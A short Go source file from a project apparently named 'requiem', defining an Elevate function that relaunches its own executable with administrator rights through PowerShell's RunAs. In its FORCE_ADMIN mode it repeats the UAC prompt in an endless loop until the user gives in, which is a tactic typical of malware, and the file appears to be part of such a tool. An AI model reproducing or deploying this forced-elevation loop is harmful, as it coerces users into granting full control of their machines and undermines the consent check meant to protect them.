package funcs

import (
	"os"
	"os/exec"

	"requiem/store"
)

func Elevate() {
	if store.FORCE_ADMIN {
		for {
			cmd := exec.Command("powershell", "-c",
				"Start-Process", "\""+store.ExecPath+"\"",
				"-Verb", "RunAs",
			)

			err := cmd.Run()
			if err != nil {
				continue
			}

			os.Exit(0)
		}
	}

	if store.PROMPT_ADMIN {
		cmd := exec.Command("powershell", "-c",
			"Start-Process", "\""+store.ExecPath+"\"",
			"-Verb", "RunAs",
		)

		err := cmd.Run()
		if err != nil && !store.CONTINUE_WITHOUT_ADMIN {
			os.Exit(0)
		}
	}
}
